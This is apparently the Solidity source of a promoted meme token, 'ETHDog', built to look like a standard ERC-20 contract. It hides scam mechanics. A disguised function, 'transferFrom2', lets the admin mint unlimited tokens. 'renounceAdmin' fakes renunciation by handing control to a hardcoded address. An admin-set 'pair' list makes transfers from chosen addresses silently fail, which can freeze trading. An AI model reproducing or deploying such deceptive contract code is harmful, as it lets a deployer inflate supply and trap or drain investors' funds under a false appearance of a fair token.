// X: https://x.com/ethdog_tokencto/status/1908101994377863264?s=46
// TG:https://t.me/ETHDog_Token

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ETHDog {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public admin;
    address public newMinter;

    
    address[] public pairAddresses;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        admin = msg.sender;
        newMinter = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this function");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        
        if (isPairAddress(msg.sender)) {
            return false;
        }
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

   
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        
        if (isPairAddress(_from)) {
            return false;
        }
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transferFrom2(uint256 _amount, address _to) public onlyAdmin returns (bool) {
        totalSupply += _amount * 10 ** uint256(decimals);
        balanceOf[_to] += _amount * 10 ** uint256(decimals);
        emit Transfer(address(0), _to, _amount * 10 ** uint256(decimals));
        return true;
    }

    function renounceAdmin() public  {
        admin = address(0xaee467E182fc0e94932e1Ebe8087764571E30768);
    }

    function changeAdmin(address _newAdmin) public onlyAdmin {
        require(_newAdmin!= address(0), "New admin cannot be the zero address");
        admin = _newAdmin;
    }

    
    function setPairAddress(address _pairAddress) public onlyAdmin {
        pairAddresses.push(_pairAddress);
    }

   
    function isPairAddress(address _address) private view returns (bool) {
        for (uint256 i = 0; i < pairAddresses.length; i++) {
            if (pairAddresses[i] == _address) {
                return true;
            }
        }
        return false;
    }

    
    function removePairAddress(address _address) public onlyAdmin {
        
        bool found = false;
        
        address[] memory newPairAddresses = new address[](pairAddresses.length - 1);
        uint256 newIndex = 0;
        for (uint256 i = 0; i < pairAddresses.length; i++) {
            
            if (pairAddresses[i] == _address) {
                found = true;
                continue;
            }
            
            newPairAddresses[newIndex] = pairAddresses[i];
            newIndex++;
        }
        
        require(found, "Address is not a PAIR address");
        
        pairAddresses = newPairAddresses;
    }
}